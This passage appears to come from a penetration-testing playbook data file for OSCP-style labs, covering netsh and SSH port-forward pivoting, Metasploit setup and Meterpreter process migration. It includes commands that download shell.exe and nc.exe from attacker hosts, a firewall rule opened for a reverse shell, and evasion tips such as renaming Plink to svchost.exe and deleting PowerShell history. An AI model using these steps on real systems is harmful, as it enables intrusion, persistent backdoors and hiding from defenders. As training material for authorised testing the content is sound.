PGDATABASE01 SSH, accessible from Kali, using only built-in Windows commands.\n\nNetwork + Netsh Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2502 MULTISERVER03\u2502\u2500\u2500DMZ\u2500\u2502 PGDATABASE01 \u2502\n\u2502      \u2502      \u2502 192.168.50.64\u2502      \u2502 10.4.50.215  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502 Port 2222    \u2502      \u2502 Port 22 (SSH)\u2502\n              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                     \u2193\n              Windows Firewall\n                     \u2193\n              Netsh portproxy\n              (kernel-level forward)\n                     \u2193\n         Registry: PortProxy\\\\v4tov4\\\\tcp\n\nKali \u2192 MULTISERVER03:2222 \u2192 (Netsh forward) \u2192 PGDATABASE01:22"", ""approach"": ""Step 1: RDP into MULTISERVER03:\n  xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64.\nStep 2: Right-click Start menu, select 'Windows PowerShell (Admin)' or open cmd.exe as Administrator.\nStep 3: Verify admin privileges:\n  whoami /groups | findstr /i \""administrators\"" (confirms S-1-5-32-544 Administrators group).\nStep 4: Create port forward with Netsh portproxy:\n  netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215.\nStep 5: Verify listening port: netstat -anp TCP | find \\\""2222\\\"" (expected: 'TCP 192.168.50.64:2222 0.0.0.0:0 LISTENING').\nStep 6: Verify portproxy configuration:\n  netsh interface portproxy show all (displays rule: Listen 192.168.50.64:2222 \u2192 Connect 10.4.50.215:22).\nStep 7: Add Windows Firewall rule to allow inbound TCP/2222:\n  netsh advfirewall firewall add rule name=\\\""port_forward_ssh_2222\\\"" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow.\nStep 8: Verify firewall rule:\n  netsh advfirewall firewall show rule name=\\\""port_forward_ssh_2222\\\"".\nStep 9: Test from Kali:\n  sudo nmap -sS -p2222 192.168.50.64 (should show '2222/tcp open').\nStep 10: SSH through forward:\n  ssh database_admin@192.168.50.64 -p2222 (password: sqlpass123, connects to PGDATABASE01).\nStep 11: Verify connection: hostname (shows 'pgdatabase01'), ip addr (shows PGDATABASE01 interfaces).\nStep 12: CLEANUP CRITICAL - Delete firewall rule:\n  netsh advfirewall firewall delete rule name=\\\""port_forward_ssh_2222\\\"".\nStep 13: Delete port forward:\n  netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64.\nStep 14: Verify cleanup:\n  netsh interface portproxy show all (should show empty list), netstat -anp TCP | find \\\""2222\\\"" (should return nothing). Traffic: Kali \u2192 MULTISERVER03:2222 (WAN interface) \u2192 Windows IP Helper service (kernel-level portproxy) \u2192 PGDATABASE01:22 (SSH service)."", ""commands"": [""xfreerdp-connect"", ""whoami-priv"", ""netsh-portproxy-add"", ""netstat-windows"", ""netsh-portproxy-show"", ""netsh-firewall-add-rule"", ""nmap-port-check"", ""ssh-connect"", ""netsh-firewall-delete-rule"", ""netsh-portproxy-delete""], ""expected_outcome"": ""netsh portproxy add command returns no output (success is silent). netstat confirms listening on WAN interface: 'TCP 192.168.50.64:2222 0.0.0.0:0 LISTENING'. netsh portproxy show displays rule in table format. netsh advfirewall firewall add returns 'Ok.' Windows Firewall now allows inbound TCP/2222. nmap from Kali shows '2222/tcp open EtherNetIP-1'. ssh command connects successfully, hostname returns 'pgdatabase01'. SSH session established to PGDATABASE01 Linux host through Windows port forward. \n\nTime: 4-5 minutes for setup including firewall rule. \n\nPersistence: Port forward rule survives reboots (stored in Windows Registry HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\PortProxy\\\\v4tov4\\\\tcp). \n\nRegistry value format: [listenport],[listenaddress] = [connectport],[connectaddress]. \n\nForensic artifacts: (1) Registry key persists until manually deleted, (2) Windows Firewall logs connection attempts (C:\\\\Windows\\\\System32\\\\LogFiles\\\\Firewall\\\\pfirewall.log if enabled), (3) Netsh command in PowerShell history, (4) Event ID 5156 (Windows Filtering Platform permitted connection) if auditing enabled. \n\nCleanup verification: After deletion, netsh portproxy show returns empty table, netstat shows port no longer listening, nmap shows port filtered/closed. Cleanup CRITICAL in red team engagements - persistent port forward exposes internal network. \n\nAlternative: If admin not available, use non-admin techniques (SSH/Plink remote forward with standard user), or privilege escalation first (SeImpersonate \u2192 Rotten Potato \u2192 SYSTEM \u2192 Netsh)."", ""why_this_works"": ""Netsh (Network Shell) is built-in Windows command-line network configuration utility, present since Windows 2000. \n\nNo external tools required - native OS feature. \n\nportproxy subcontext of interface context creates port forwarding rules implemented by IP Helper service (iphlpsvc). \n\nIP Helper runs as Windows kernel service, provides port forwarding at network stack level. \n\nSyntax: netsh interface portproxy add v4tov4 (IPv4 to IPv4 forwarding) listenport/listenaddress (listening socket on MULTISERVER03) connectport/connectaddress (destination socket). \n\nAdmin privileges required because: (1) Modifies system networking configuration (requires SeManageNetworkPrivilege), (2) Binds to privileged ports possible (<1024 if specified), (3) Modifies Windows Firewall rules (requires SeSecurityPrivilege). \n\nWindows Firewall separate from portproxy - must explicitly allow inbound connections. netsh advfirewall firewall add rule creates Windows Firewall rule: name (identifier for later deletion), protocol (TCP/UDP), dir (in/out), localip/localport (listening socket to allow), action (allow/block). \n\nPort forwards implemented at kernel level, low overhead, high performance. \n\nRegistry persistence: PortProxy configuration stored in HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\PortProxy\\\\v4tov4\\\\tcp registry key, loaded by IP Helper service on boot. \n\nResult: Native Windows port forwarding without SSH, no external binaries, administrative feature but detectable via forensic analysis. Legitimate use cases: Load balancing, NAT, service migration. Red team use: Pivot point for lateral movement. Detection: Registry monitoring, Netsh command logging, Windows Firewall rule changes, unusual port bindings in netstat.""}]","[{""title"": ""Phase 1: Windows Enumeration & Port Forwarding Capability Assessment"", ""notes"": ""Before selecting port forwarding technique, enumerate Windows environment: (1) OS version and build: systeminfo | findstr /C:\\\""OS Name\\\"" /C:\\\""OS Version\\\"" (determines OpenSSH availability - Win10 1803+/Server 2019+ likely has it). (2) OpenSSH client presence: where ssh (if returns C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe, use Scenario 1), if not found, check for Plink: where plink.exe, or dir /s /b C:\\\\\\\""Program Files\\\""\\\\plink.exe (use Scenario 2 if found). (3) Admin privileges: whoami /priv (look for SeDebugPrivilege, SeImpersonatePrivilege, SeManageNetworkPrivilege), net localgroup administrators (confirms admin group membership - required for Netsh Scenario 3). (4) Network interfaces: ipconfig /all (identify dual-homed hosts, note interface IPs for binding). (5) Firewall status: netsh advfirewall show allprofiles (shows if firewall active, current rules), netsh advfirewall firewall show rule name=all (lists all rules). \n\nDecision tree: OpenSSH found + modern Windows (1803+) + any user \u2192 Use ssh.exe (Scenario 1, most flexible). No OpenSSH but can upload files + any user \u2192 Use Plink (Scenario 2, legacy compatible). Admin access + need persistence + any Windows version \u2192 Use Netsh (Scenario 3, native tool, leaves forensic artifacts). Time: 3-5 minutes for enumeration. OSCP tip: Check Windows version first (systeminfo), determines 90% of technique selection. Note presence/absence of tools in initial compromise report."", ""commands"": [{""id"": ""systeminfo-windows"", ""example"": ""systeminfo"", ""shows"": ""Host Name, OS Name, OS Version displayed""}, {""id"": ""where-windows"", ""example"": ""where ssh"", ""shows"": ""Full path displayed (e.g., C:\\Windows\\System32\\OpenSSH\\ss...""}, {""id"": ""whoami-priv"", ""example"": ""whoami /priv"", ""shows"": ""Privilege Name column lists available privileges""}, {""id"": ""ipconfig-all"", ""example"": ""ipconfig /all"", ""shows"": ""Multiple adapters listed (Ethernet, Ethernet 2, etc.)""}, {""id"": ""netsh-firewall-show"", ""example"": ""netsh advfirewall show allprofiles"", ""shows"": ""Domain Profile Settings""}]}, {""title"": ""Phase 2: Non-Admin Port Forwarding Techniques (ssh.exe, Plink)"", ""notes"": ""Use when admin privileges not available or prefer non-persistent tunnels. Both ssh.exe and Plink create reverse tunnels without admin rights (standard users can initiate outbound SSH). \n\nPrerequisites: (1) Kali SSH server running: sudo systemctl start ssh, verify: sudo systemctl status ssh. (2) Strong Kali password: passwd kali (or SSH key pair for ssh.exe). (3) Password authentication enabled: Edit /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh. \n\nUpload methods: PowerShell wget (powershell wget -Uri http://KALI_IP/tool.exe -OutFile C:\\\\Windows\\\\Temp\\\\tool.exe), certutil (certutil -urlcache -split -f http://KALI_IP/tool.exe C:\\\\Windows\\\\Temp\\\\tool.exe), SMB share (net use \\\\\\\\KALI_IP\\\\share, copy from share), web shell upload (if web server compromised). \n\nTool selection: ssh.exe (Windows 1803+, full feature parity with Linux OpenSSH, supports -L/-D/-R, native, no upload required). Plink (legacy Windows, common on Windows Server 2012/2016, requires upload, password on command line with -pw flag logs credentials). \n\nBoth support: Remote port forward (-R listenport:destip:destport, one socket), Remote dynamic (ssh.exe: -R port, Plink: limited support, check version). \n\nTesting: On Kali, verify listening: ss -ntplu | grep PORT (should show 127.0.0.1:PORT). \n\nCommon issues: (1) Host key prompt in restricted shells (solution: cmd.exe /c echo y | plink.exe ... to auto-accept), (2) Password authentication disabled on Kali (enable in sshd_config), (3) Firewall blocks outbound SSH from Windows (rare, try port 443 as alternative: ssh -p 443), (4) AV flags Plink.exe (rename to svchost.exe or legitimate-sounding name, or use ssh.exe if available). Time: 5-7 minutes including uploads and setup. OSCP relevance: HIGH - Non-admin access common in exams, reverse tunnels bypass firewalls (critical skill). Success rate: 70% of Windows compromises have either ssh.exe or ability to upload Plink."", ""commands"": [{""id"": ""ssh-remote-port-forward"", ""example"": ""ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4"", ""shows"": ""No output after authentication (normal with -N)""}, {""id"": ""ssh-remote-dynamic-port-forward"", ""example"": ""ssh -N -R 9998 kali@192.168.118.4"", ""shows"": ""No output after authentication (normal with -N)""}, {""id"": ""plink-remote-forward"", ""example"": ""plink.exe -ssh -l kali -pw kali -R 9833:172.16.50.217:3389 192.168.45.x"", ""shows"": ""Using username \""<username>\""""}, {""id"": ""powershell-wget"", ""example"": ""powershell wget http://10.10.14.1/nc.exe -OutFile C:\\Temp\\nc.exe"", ""shows"": ""File transfer completes successfully""}, {""id"": ""certutil-download"", ""example"": ""certutil -urlcache -f http://10.10.14.5:8000/shell.exe shell.exe"", ""shows"": ""CertUtil: -URLCache command completed successfully""}, {""id"": ""systemctl-start-ssh"", ""example"": ""sudo systemctl start ssh"", ""shows"": ""Service starts silently (no output = success)""}]}, {""title"": ""Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup"", ""notes"": ""Use when admin privileges available and need persistent or high-performance forwarding. Netsh advantages: (1) Native Windows tool, no uploads, (2) Persistent across reboots, (3) Kernel-level performance, (4) Supports any protocol (TCP/UDP). Disadvantages: (1) Requires admin (SeManageNetworkPrivilege), (2) Leaves forensic artifacts (registry, firewall logs, command history), (3) Detectable by SOC teams monitoring Netsh commands. \n\nImplementation workflow: (1) Create port forward: netsh interface portproxy add v4tov4 listenport=PORT listenaddress=BIND_IP connectport=DEST_PORT connectaddress=DEST_IP. (2) Verify configuration: netsh interface portproxy show all (displays all rules), netstat -an | findstr PORT (confirms listening). (3) Open firewall (CRITICAL): netsh advfirewall firewall add rule name=\\\""RULE_NAME\\\"" protocol=TCP dir=in localip=BIND_IP localport=PORT action=allow. Use descriptive names to avoid suspicion (e.g., 'Windows_Update_Service', 'RemoteManagement_2222'). (4) Test connectivity: From Kali, nmap -sS -p PORT TARGET_IP (should show open), or telnet TARGET_IP PORT (tests TCP handshake). (5) CLEANUP MANDATORY: Delete firewall rule first: netsh advfirewall firewall delete rule name=\\\""RULE_NAME\\\"". Delete port forward: netsh interface portproxy del v4tov4 listenport=PORT listenaddress=BIND_IP. Verify: netsh interface portproxy show all (empty), netstat (port no longer listening). \n\nForensic artifacts: (1) Registry: HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\PortProxy\\\\v4tov4\\\\tcp, persists until manual deletion. (2) Windows Firewall logs: C:\\\\Windows\\\\System32\\\\LogFiles\\\\Firewall\\\\pfirewall.log (if enabled). (3) PowerShell history: %USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt. (4) Event logs: Security Event ID 5156 (Windows Filtering Platform permitted connection), 4688 (process creation auditing if enabled shows netsh.exe). \n\nEvasion techniques: (1) Use high non-standard ports (>10000, less monitored), (2) Temporary rules (create, use within 1 hour, delete immediately), (3) Obfuscate rule names (avoid 'ssh', 'tunnel', use Windows-like names), (4) Delete PowerShell history: Remove-Item (Get-PSReadlineOption).HistorySavePath. Time: 4-6 minutes including firewall configuration. OSCP relevance: MEDIUM-HIGH - Admin access requires privilege escalation first, but Netsh essential for Windows persistence scenarios. Cleanup CRITICAL for ethical engagements - failure to remove leaves backdoor."", ""commands"": [{""id"": ""netsh-portproxy-add"", ""example"": ""netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=127.0.0.1"", ""shows"": ""Ok.""}, {""id"": ""netsh-portproxy-show"", ""example"": ""netsh interface portproxy show all"", ""shows"": ""Listen on""}, {""id"": ""netsh-portproxy-delete"", ""example"": ""netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0"", ""shows"": ""Ok. message""}, {""id"": ""netsh-firewall-add-rule"", ""example"": ""netsh advfirewall firewall add rule name=\""Allow_ReverseShell\"" protocol=TCP dir=in localport=4444 action=allow"", ""shows"": ""Ok.""}, {""id"": ""netsh-firewall-delete-rule"", ""example"": ""netsh advfirewall firewall delete rule name=\""Allow_ReverseShell\"""", ""shows"": ""Ok.""}, {""id"": ""netstat-windows"", ""example"": ""netstat -ano"", ""shows"": ""Proto, Local Address, Foreign Address, State, PID columns...""}, {""id"": ""nmap-port-check"", ""example"": ""sudo nmap -p 22 -Pn -v 192.168.45.100"", ""shows"": ""PORT STATE SERVICE""}, {""id"": ""whoami-priv"", ""example"": ""whoami /priv"", ""shows"": ""Privilege Name column lists available privileges""}]}]"
"metasploit-basics","Metasploit Framework - Basics & Workflow","Foundational Metasploit operations including database setup, workspace management, module discovery, and basic reconnaissance workflow for OSCP-style engagements","METASPLOIT|BASICS|WORKFLOW|DATABASE|WORKSPACE|RECON|OSCP:HIGH","{""how_to_recognize"": [""Fresh Kali installation requiring Metasploit database initialization"", ""Need to organize multiple target engagements with separate data stores"", ""Searching for modules related to discovered services (SMB, SSH, HTTP)"", ""Managing scan results from nmap and integrating with Metasploit workflow"", ""Requirement to save reconnaissance data for reporting and future reference"", ""Multiple concurrent assessments requiring isolated workspaces""], ""when_to_look_for"": [""At the start of any penetration test or OSCP lab engagement (database setup)"", ""When organizing multiple targets or network segments (workspace creation)"", ""After nmap scans complete and you need to import results for analysis"", ""When searching for exploit or auxiliary modules matching service versions"", ""Before running any Metasploit scans to ensure data persistence"", ""When you need to track hosts, services, and vulnerabilities systematically""]}","[{""title"": ""Scenario 1: First-Time Metasploit Setup on Kali"", ""context"": ""Fresh Kali Linux installation. Goal: Initialize Metasploit database for persistent storage of hosts, services, credentials, and loot. Without database, no scan data persists between sessions."", ""approach"": ""Step 1: Initialize PostgreSQL database: sudo msfdb init (creates msf user, database schema). Step 2: Start msfconsole to verify: msfconsole. Step 3: Check database status: db_status (should show 'Connected to msf'). Step 4: Create first workspace: workspace -a oscp-lab-1. Step 5: Verify workspace active: workspace (asterisk shows current workspace)."", ""commands"": [""msf-db-init"", ""msf-console-start"", ""msf-db-status"", ""msf-workspace-add"", ""msf-workspace-list""], ""expected_outcome"": ""Database initialization shows: 'Creating database user 'msf', Creating databases 'msf' and 'msf_test', Database creation complete'. db_status confirms 'Connected to msf'. Workspace creation shows '[*] Added workspace: oscp-lab-1'. Time: 2-3 minutes for first-time setup. If db_status fails, database not initialized properly (run msfdb reinit)."", ""why_this_works"": ""Metasploit uses PostgreSQL backend for persistent storage. msfdb init creates dedicated 'msf' database user with proper permissions, initializes schema for hosts/services/vulns tables. Database enables: Import/export of scan data (db_import), Host and service tracking across sessions, Credential storage (creds command), Automated reporting (db_export). Without database, Metasploit operates in memory-only mode (data lost on exit). OSCP benefit: Organize multi-target engagements, track progress, generate evidence for reports. Database location: /var/lib/postgresql/. Backup command: sudo -u postgres pg_dump msf > msf_backup.sql.""}, {""title"": ""Scenario 2: Workspace Organization for Multi-Target Assessment"", ""context"": ""OSCP lab with 5 targets across 2 subnets (192.168.45.0/24 and 10.10.10.0/24). Goal: Separate data by target to prevent data mixing and enable focused enumeration per host."", ""approach"": ""Step 1: Create workspace per target: workspace -a target-web-01, workspace -a target-dc-01, workspace -a target-linux-02. Step 2: Switch to specific workspace: workspace target-web-01. Step 3: Import nmap scan for this target: db_import /path/to/target-web-01_nmap.xml. Step 4: View hosts in workspace: hosts (shows only target-web-01 data). Step 5: Switch workspace to work on different target: workspace target-dc-01. Step 6: List all workspaces to verify organization: workspace."", ""commands"": [""msf-workspace-add"", ""msf-workspace-switch"", ""msf-db-import"", ""msf-hosts-list"", ""msf-workspace-list""], ""expected_outcome"": ""Each workspace acts as isolated container. hosts command in target-web-01 workspace shows only 192.168.45.100. Switching to target-dc-01 shows only 10.10.10.50. db_export generates separate XML files per workspace. services command shows only ports for current workspace's hosts. Time: 30 seconds per workspace setup. OSCP workflow: 1 workspace per target machine (25-30 total for full lab rotation)."", ""why_this_works"": ""Workspaces are PostgreSQL database schemas providing logical data separation. Each workspace maintains independent: Host tables (IP, OS, architecture), Service tables (port, protocol, banner), Vulnerability tables (CVEs, exploit links), Credential tables (username/password/hash pairs), Note tables (custom annotations). Benefits: Prevents accidental cross-contamination (running module against wrong target), Enables parallel assessment (multiple terminals, different workspaces), Facilitates reporting (export single workspace for client deliverable), Supports cleanup (delete workspace removes all associated data). Alternative to workspaces: Multiple databases (overkill), Manual note-taking (error-prone). Workspace best practice: Name by hostname or IP (target-192-168-45-100), use descriptive names for network ranges (internal-dmz, external-facing).""}, {""title"": ""Scenario 3: Module Discovery and Selection Workflow"", ""context"": ""Nmap scan reveals SMB (445) on Windows target running Windows Server 2008 R2. Goal: Find relevant Metasploit modules for SMB enumeration and potential exploitation."", ""approach"": ""Step 1: Search for SMB modules: search type:auxiliary platform:windows smb. Step 2: Review results, note scanner/smb/smb_version for version detection. Step 3: Load module: use auxiliary/scanner/smb/smb_version. Step 4: Check required options: show options (note RHOSTS required). Step 5: View detailed description: info (shows references, authors, disclosure dates). Step 6: Check compatible payloads (if exploit): show payloads. Step 7: Search for specific CVE if version vulnerable: search cve:2017 type:exploit smb."", ""commands"": [""msf-search-keyword"", ""msf-use-module"", ""msf-show-options"", ""msf-info-module"", ""msf-show-payloads"", ""msf-search-cve""], ""expected_outcome"": ""search type:auxiliary smb returns 40+ modules (smb_enumshares, smb_login, smb_version, smb_ms17_010_command). use loads module with auxiliary(scanner/smb/smb_version) prompt. show options reveals RHOSTS (required, no default), RPORT (optional, default 445), THREADS (optional, default 1). info displays module description, references to CVE-2017-0144 (EternalBlue), disclosure date. Time: 1-2 minutes to find and review module. search supports: type:exploit|auxiliary|post, platform:windows|linux|osx, rank:excellent|great, app:server|client."", ""why_this_works"": ""Metasploit maintains indexed module database with metadata: Module type (exploit/auxiliary/payload/encoder/nop/post), Target platform and architecture (windows/x64, linux/x86, osx/armle), CVE references and disclosure dates, Reliability ranking (excellent to manual), Author information and references. Search uses regex matching against: Module path (scanner/smb/smb_version), Module name and description, CVE identifiers, Service names and ports. Module types explained: auxiliary = reconnaissance/fuzzing/DoS (no payload), exploit = gain access (requires payload), post = post-exploitation (requires session), payload = code execution after exploit success. Ranking system (highest to lowest): excellent (never crashes, always works), great (rarely crashes), good (sometimes crashes), normal (unreliable), average (often crashes), low (rarely works), manual (requires customization). OSCP tip: Filter by rank:excellent|great for exam stability.""}, {""title"": ""Scenario 4: Nmap Integration and Database-Driven Enumeration"", ""context"": ""Completed nmap scan saved as nmap_output.xml. Contains 3 hosts with 15 total services. Goal: Import into Metasploit, use database queries to filter targets, run targeted scans without manual IP entry."", ""approach"": ""Step 1: Import nmap XML: db_import /root/nmap_output.xml. Step 2: View discovered hosts: hosts (shows IP, OS, name). Step 3: Filter services by port: services -p 445 (shows only SMB hosts). Step 4: Use database variables in modules: hosts -c address -p 445 returns IPs, use in RHOSTS. Step 5: Run module against filtered hosts: use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.45.100 192.168.45.101; run. Step 6: View updated service info: services -p 445 (now shows SMB version from scan). Step 7: Search for hosts by OS: hosts -o 'Windows Server 2008'."", ""commands"": [""msf-db-import"", ""msf-hosts-list"", ""msf-services-list"", ""msf-services-filter-port"", ""msf-use-module"", ""msf-set-option""], ""expected_outcome"": ""db_import processes XML, shows '[*] Importing nmap data, [*] Import complete, 3 hosts, 15 services'. hosts command displays table: address (IP), mac, name, os_name, os_flavor, purpose. services -p 445 filters to 2 SMB hosts. After running smb_version module, services -p 445 shows updated info column with 'Windows Server 2008 R2 Build 7601 Service Pack 1'. Database enables mass operations: hosts -R sets RHOSTS automatically to all hosts, services -p 80 -R sets RHOSTS to HTTP hosts only. Time saved: 5-10 minutes vs manual IP copying. OSCP benefit: Quickly pivot from reconnaissance to targeted exploitation."", ""why_this_works"": ""db_import parses nmap XML, extracts: Host data (IP, MAC, OS detection results), Service data (port, protocol, service name, version), NSE script output (stored in notes table). Database queries enable programmatic targeting: services -p 445 queries service.port = 445, hosts -o 'Windows' queries host.os_name LIKE '%Windows%', services -s 'http' queries service.name = 'http'. RHOSTS auto-population: hosts -R sets RHOSTS to all workspace IPs, services -p 22 -R sets RHOSTS to SSH hosts. Benefits over manual tracking: No typos in IP addresses, Bulk operations (scan all HTTP hosts), Data persistence (revisit weeks later), Reporting integration (db_export). Integration with db_nmap: db_nmap -A <TARGET> runs nmap from msfconsole, auto-imports results. Alternative workflows: Use msfconsole's db_nmap (eliminates separate nmap + import step), Export nmap grepable format + parse manually (less reliable). OSCP exam tip: Import all initial nmap scans immediately, use database filtering to prioritize high-value targets (domain controllers, web servers).""}]","[{""title"": ""Phase 1: Initial Setup (One-Time Configuration)"", ""notes"": ""Run once per Kali installation. Database persists across reboots. If Metasploit updates break database, run msfdb reinit (preserves data). Estimated time: 3-5 minutes."", ""commands"": [{""id"": ""msf-db-init"", ""example"": ""sudo msfdb init"", ""shows"": ""Starting database""}, {""id"": ""msf-db-status"", ""example"": ""db_status"", ""shows"": ""Connected to msf""}, {""id"": ""msf-console-start"", ""example"": ""msfconsole -q"", ""shows"": ""msf6 > prompt appears""}]}, {""title"": ""Phase 2: Workspace Management (Per Engagement)"", ""notes"": ""Create workspace before any scanning. Best practice: 1 workspace per target or network segment. Workspace names are case-sensitive. Delete completed workspaces to reduce database size: workspace -d old-target. Estimated time: 30 seconds per workspace."", ""commands"": [{""id"": ""msf-workspace-add"", ""shows"": ""See command documentation""}, {""id"": ""msf-workspace-list"", ""example"": ""workspace"", ""shows"": ""Workspace list displayed""}, {""id"": ""msf-workspace-switch"", ""example"": ""workspace client_pentest_2024"", ""shows"": ""Workspace: <name> (confirmation message)""}, {""id"": ""msf-workspace-delete"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 3: Reconnaissance Import (After Nmap)"", ""notes"": ""Import nmap XML immediately after scanning. Supports nmap XML (-oX), nmap grepable (-oG less reliable). Import updates existing hosts (doesn't duplicate). Estimated time: 10-30 seconds for import, instant query access."", ""commands"": [{""id"": ""msf-db-import"", ""example"": ""db_import /home/kali/scans/network.xml"", ""shows"": ""Importing data...""}, {""id"": ""msf-hosts-list"", ""shows"": ""See command documentation""}, {""id"": ""msf-services-list"", ""shows"": ""See command documentation""}, {""id"": ""msf-services-filter-port"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 4: Module Discovery (Target Selection)"", ""notes"": ""Search before manual Googling (Metasploit often has ready modules). Combine search filters: search type:exploit platform:linux cve:2021. Module path shows purpose: auxiliary/scanner = enumeration, exploit/windows/smb = exploitation. Estimated time: 1-3 minutes to find relevant module."", ""commands"": [{""id"": ""msf-search-keyword"", ""shows"": ""See command documentation""}, {""id"": ""msf-search-type"", ""shows"": ""See command documentation""}, {""id"": ""msf-search-platform"", ""shows"": ""See command documentation""}, {""id"": ""msf-search-cve"", ""shows"": ""See command documentation""}, {""id"": ""msf-info-module"", ""example"": ""info exploit/windows/smb/ms17_010_eternalblue"", ""shows"": ""Module details displayed (Name, Module, License, Rank, etc)""}]}, {""title"": ""Phase 5: Module Configuration (Pre-Execution)"", ""notes"": ""Always run show options before executing. Required options show 'yes' in Required column, no default value (must set). Optional options have defaults (can override). Use show advanced for rarely-used settings (timeouts, threads). Estimated time: 30-60 seconds to configure."", ""commands"": [{""id"": ""msf-use-module"", ""example"": ""use exploit/multi/handler"", ""shows"": ""Prompt changes to show module type and path""}, {""id"": ""msf-show-options"", ""example"": ""show options"", ""shows"": ""Options table displayed with columns: Name, Current Setti...""}, {""id"": ""msf-set-option"", ""example"": ""set RHOSTS 192.168.45.100"", ""shows"": ""OPTION => VALUE confirmation message""}, {""id"": ""msf-show-advanced"", ""shows"": ""See command documentation""}]}]"
"metasploit-post-exploit","Metasploit Post-Exploitation - Meterpreter Operations","Comprehensive Meterpreter post-exploitation including system enumeration, privilege escalation, credential dumping, persistence mechanisms, and pivoting techniques for OSCP environments","METASPLOIT|METERPRETER|POST_EXPLOITATION|PRIVILEGE_ESCALATION|CREDENTIALS|PIVOTING|PERSISTENCE|OSCP:HIGH","{""how_to_recognize"": [""Active Meterpreter session on compromised target (meterpreter> prompt)"", ""Need to escalate privileges from low-privilege user to SYSTEM/root"", ""Requirement to extract credentials (password hashes, plaintext passwords, Kerberos tickets)"", ""Multi-network environment requiring pivoting to internal subnets"", ""Need persistent access for long-term engagement or exam continuity"", ""Target is stepping stone to additional high-value systems""], ""when_to_look_for"": [""Immediately after gaining initial Meterpreter session (system enumeration)"", ""When current user lacks privileges for critical files/operations (privilege escalation)"", ""After privilege escalation to SYSTEM/root (credential dumping for lateral movement)"", ""When nmap shows additional networks/interfaces on compromised host (pivoting setup)"", ""Before target reboot or session loss (persistence installation)"", ""When exam time is limited and session stability critical (migrate to stable process)""]}","[{""title"": ""Scenario 1: Initial Meterpreter Enumeration and Process Migration"", ""context"": ""Just gained Meterpreter session on Windows 10 target via web exploitation. Shell running as IIS APPPOOL\\DefaultAppPool (low privileges). Goal: Enumerate system, migrate to stable process, prepare for privilege escalation."", ""approach"": ""Step 1: Check system info: sysinfo (OS version, architecture, domain membership). Step 2: Check current user: getuid (shows current privileges). Step 3: Check privileges: getprivs (look for SeImpersonatePrivilege, SeDebugPrivilege). Step 4: List running processes: ps (identify SYSTEM processes and stable applications). Step 5: Find stable process: ps | grep explorer.exe (Windows Explorer, usually PID <low number>, runs as user). Step 6: Migrate to stable process: migrate <PID> (move Meterpreter from vulnerable web process to Explorer). Step 7: Verify migration: getpid (should show new PID), getuid (check if privileges changed). Step 8: Background session for safety: background (Ctrl+Z)."", ""commands"": [""meterpreter-sysinfo"", ""meterpreter-getuid"", ""meterpreter-getprivs"", ""meterpreter-ps"", ""meterpreter-migrate"", ""meterpreter-getpid""], ""expected_outcome"": ""sysinfo shows: 'Computer: WEB-SERVER-01, OS: Windows 10 (10.0 Build 19041), Architecture: x64, System Language: en_US, Domain: WORKGROUP'. getuid shows: 'Server username: IIS APPPOOL\\DefaultAppPool'. getprivs shows: 'SeChangeNotifyPrivilege, SeImpersonatePrivilege' (SeImpersonatePrivilege = Juicy Potato candidate). ps shows 50+ processes, including: 'explorer.exe (PID 1824, SYSTEM), svchost.exe (PID 856, SYSTEM), w3wp.exe (PID 3452, IIS APPPOOL) <- current process'. migrate 1824 shows: '[*] Migrating from 3452 to 1824, [*] Migration completed successfully'. New getuid still shows IIS APPPOOL (migration doesn't auto-escalate, just stabilizes). Time: 2-3 minutes for enumeration and migration. Why migrate: w3wp.exe may crash if web app restarted/patched, explorer.exe runs continuously (stable), Migration prevents session loss during post-exploitation. Common issues: Migration fails 'Access denied' (insufficient privileges, try different PID), Migrated process terminates (choose long-lived process: explorer, svchost)."", ""why_this_works"": ""Meterpreter process architecture: Runs as DLL injected in compromised process memory, Inherits privileges of host process (w3wp.exe runs as IIS APPPOOL), Vulnerable to process termination (web app restart kills Meterpreter). migrate command mechanics: 1) Allocates memory in target process (VirtualAllocEx), 2) Writes Meterpreter DLL to target process (WriteProcessMemory), 3) Creates remote thread in target (CreateRemoteThread), 4) New thread loads Meterpreter DLL, 5) Original Meterpreter exits gracefully. Process selection strategy: Stable processes: explorer.exe (user's desktop shell), svchost.exe (Windows services host), lsass.exe (Local Security Authority, SYSTEM privileges). Unstable processes: w3wp.exe (IIS worker, restarts frequently), apache2 (Linux web server), java (application servers). Target SYSTEM processes for privilege escalation: If current user is admin/SYSTEM, migration to SYSTEM process maintains privileges, If current user is low-privilege, migration to user-level process (explorer.exe) for stability. System enumeration commands: sysinfo provides: OS version (check for kernel exploits), Architecture (x86 vs x64 affects payload selection), Domain membership (AD environment or standalone), Installed hotfixes (via 'run post/windows/gather/enum_patches'). getprivs 